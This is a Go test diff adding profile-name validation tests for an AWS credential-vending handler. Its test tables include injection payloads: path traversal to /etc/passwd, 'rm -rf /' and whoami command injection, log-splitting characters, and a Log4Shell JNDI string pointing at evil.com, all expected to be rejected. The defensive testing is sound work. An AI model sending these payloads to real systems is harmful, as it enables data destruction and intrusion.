@@ -1984,3 +1984,258 @@ func TestTVMConfig_SigningFieldsDocumented(t *testing.T) {
 		t.Error("EnforcePolicySigning should be true")
 	}
 }
+
+// ============================================================================
+// Profile Name Validation Tests (134-01)
+// ============================================================================
+
+func TestHandleRequest_InvalidProfileFormat(t *testing.T) {
+	// Test that invalid profile name formats are rejected with 400 status
+	mockClient := &testSTSClient{
+		AssumeRoleFunc: func(ctx context.Context, params *sts.AssumeRoleInput, optFns ...func(*sts.Options)) (*sts.AssumeRoleOutput, error) {
+			t.Error("STS should not be called with invalid profile format")
+			return successfulTestSTSResponse(), nil
+		},
+	}
+
+	cfg := testTVMConfig(&mockPolicyLoader{policy: allowAllPolicy()}, mockClient)
+	handler := NewHandler(cfg)
+	ctx := context.Background()
+
+	tests := []struct {
+		name    string
+		profile string
+	}{
+		{
+			name:    "path_traversal_etc_passwd",
+			profile: "../../../etc/passwd",
+		},
+		{
+			name:    "path_traversal_in_path",
+			profile: "/sentinel/../secrets",
+		},
+		{
+			name:    "double_slash",
+			profile: "/sentinel//policies",
+		},
+		{
+			name:    "command_injection_semicolon",
+			profile: "profile;rm -rf /",
+		},
+		{
+			name:    "command_injection_backtick",
+			profile: "profile`whoami`",
+		},
+		{
+			name:    "shell_pipe",
+			profile: "profile|cat /etc/passwd",
+		},
+		{
+			name:    "environment_variable",
+			profile: "profile$HOME",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			req := events.APIGatewayV2HTTPRequest{
+				QueryStringParameters: map[string]string{
+					"profile": tt.profile,
+				},
+				RequestContext: events.APIGatewayV2HTTPRequestContext{
+					Authorizer: &events.APIGatewayV2HTTPRequestContextAuthorizerDescription{
+						IAM: &events.APIGatewayV2HTTPRequestContextAuthorizerIAMDescription{
+							AccountID: "123456789012",
+							UserARN:   "arn:aws:iam::123456789012:user/testuser",
+							UserID:    "AIDAEXAMPLE",
+						},
+					},
+				},
+			}
+
+			resp, err := handler.HandleRequest(ctx, req)
+			if err != nil {
+				t.Fatalf("HandleRequest() error: %v", err)
+			}
+
+			// Should return 400 Bad Request for invalid profile format
+			if resp.StatusCode != http.StatusBadRequest {
+				t.Errorf("HandleRequest() with profile %q: statusCode = %d, want %d",
+					tt.profile, resp.StatusCode, http.StatusBadRequest)
+			}
+
+			var errResp TVMError
+			if err := json.Unmarshal([]byte(resp.Body), &errResp); err != nil {
+				t.Fatalf("Failed to unmarshal error: %v", err)
+			}
+			if errResp.Code != "INVALID_PROFILE" {
+				t.Errorf("Error code = %s, want INVALID_PROFILE", errResp.Code)
+			}
+
+			// SECURITY: Error message should be generic (not echo back malicious input)
+			if errResp.Message != "Invalid profile name format" {
+				t.Errorf("Error message should be generic, got: %s", errResp.Message)
+			}
+		})
+	}
+}
+
+func TestHandleRequest_ProfileNameInjection(t *testing.T) {
+	// SECURITY TEST: Verify injection attacks via profile name are rejected
+	mockClient := &testSTSClient{
+		AssumeRoleFunc: func(ctx context.Context, params *sts.AssumeRoleInput, optFns ...func(*sts.Options)) (*sts.AssumeRoleOutput, error) {
+			t.Error("STS should not be called with injection attempt in profile")
+			return successfulTestSTSResponse(), nil
+		},
+	}
+
+	cfg := testTVMConfig(&mockPolicyLoader{policy: allowAllPolicy()}, mockClient)
+	handler := NewHandler(cfg)
+	ctx := context.Background()
+
+	tests := []struct {
+		name    string
+		profile string
+		desc    string
+	}{
+		{
+			name:    "null_byte_injection",
+			profile: "profile\x00admin",
+			desc:    "null byte terminates string in C-based systems",
+		},
+		{
+			name:    "tab_injection",
+			profile: "profile\tadmin",
+			desc:    "tab can cause log/parsing issues",
+		},
+		{
+			name:    "newline_injection",
+			profile: "profile\nadmin",
+			desc:    "newline can split logs",
+		},
+		{
+			name:    "carriage_return_injection",
+			profile: "profile\radmin",
+			desc:    "CR can cause log manipulation",
+		},
+		{
+			name:    "unicode_homoglyph",
+			profile: "\u0430lice", // Cyrillic 'a' looks like Latin 'a'
+			desc:    "unicode homoglyph can bypass visual inspection",
+		},
+		{
+			name:    "jndi_log4shell",
+			profile: "${jndi:ldap://evil.com/a}",
+			desc:    "JNDI/Log4Shell injection attempt",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			req := events.APIGatewayV2HTTPRequest{
+				QueryStringParameters: map[string]string{
+					"profile": tt.profile,
+				},
+				RequestContext: events.APIGatewayV2HTTPRequestContext{
+					Authorizer: &events.APIGatewayV2HTTPRequestContextAuthorizerDescription{
+						IAM: &events.APIGatewayV2HTTPRequestContextAuthorizerIAMDescription{
+							AccountID: "123456789012",
+							UserARN:   "arn:aws:iam::123456789012:user/testuser",
+							UserID:    "AIDAEXAMPLE",
+						},
+					},
+				},
+			}
+
+			resp, err := handler.HandleRequest(ctx, req)
+			if err != nil {
+				t.Fatalf("HandleRequest() error: %v", err)
+			}
+
+			// Should return 400 Bad Request for injection attempts
+			if resp.StatusCode != http.StatusBadRequest {
+				t.Errorf("SECURITY VIOLATION: Injection attempt with %q (%s) not rejected: statusCode = %d, want %d",
+					tt.profile, tt.desc, resp.StatusCode, http.StatusBadRequest)
+			}
+
+			var errResp TVMError
+			if err := json.Unmarshal([]byte(resp.Body), &errResp); err != nil {
+				t.Fatalf("Failed to unmarshal error: %v", err)
+			}
+			if errResp.Code != "INVALID_PROFILE" {
+				t.Errorf("Error code = %s, want INVALID_PROFILE", errResp.Code)
+			}
+		})
+	}
+}
+
+func TestHandleRequest_ValidProfileFormats(t *testing.T) {
+	// Verify valid profile formats are accepted
+	mockClient := &testSTSClient{
+		AssumeRoleFunc: func(ctx context.Context, params *sts.AssumeRoleInput, optFns ...func(*sts.Options)) (*sts.AssumeRoleOutput, error) {
+			return successfulTestSTSResponse(), nil
+		},
+	}
+
+	cfg := testTVMConfig(&mockPolicyLoader{policy: allowAllPolicy()}, mockClient)
+	handler := NewHandler(cfg)
+	ctx := context.Background()
+
+	validProfiles := []struct {
+		name    string
+		profile string
+	}{
+		{
+			name:    "simple_name",
+			profile: "production",
+		},
+		{
+			name:    "with_hyphens",
+			profile: "prod-role",
+		},
+		{
+			name:    "with_underscores",
+			profile: "prod_role",
+		},
+		{
+			name:    "ssm_path",
+			profile: "/sentinel/policies/production",
+		},
+		{
+			name:    "role_arn",
+			profile: "arn:aws:iam::123456789012:role/prod-role",
+		},
+	}
+
+	for _, tt := range validProfiles {
+		t.Run(tt.name, func(t *testing.T) {
+			req := events.APIGatewayV2HTTPRequest{
+				QueryStringParameters: map[string]string{
+					"profile": tt.profile,
+				},
+				RequestContext: events.APIGatewayV2HTTPRequestContext{
+					Authorizer: &events.APIGatewayV2HTTPRequestContextAuthorizerDescription{
+						IAM: &events.APIGatewayV2HTTPRequestContextAuthorizerIAMDescription{
+							AccountID: "123456789012",
+							UserARN:   "arn:aws:iam::123456789012:user/testuser",
+							UserID:    "AIDAEXAMPLE",
+						},
+					},
+				},
+			}
+
+			resp, err := handler.HandleRequest(ctx, req)
+			if err != nil {
+				t.Fatalf("HandleRequest() error: %v", err)
+			}
+
+			// Should succeed (not fail validation)
+			if resp.StatusCode != http.StatusOK {
+				var errResp TVMError
+				json.Unmarshal([]byte(resp.Body), &errResp)
+				t.Errorf("HandleRequest() with valid profile %q: statusCode = %d, want %d (error: %s)",
+					tt.profile, resp.StatusCode, http.StatusOK, errResp.Message)
+			}
+		})
+	}
+}
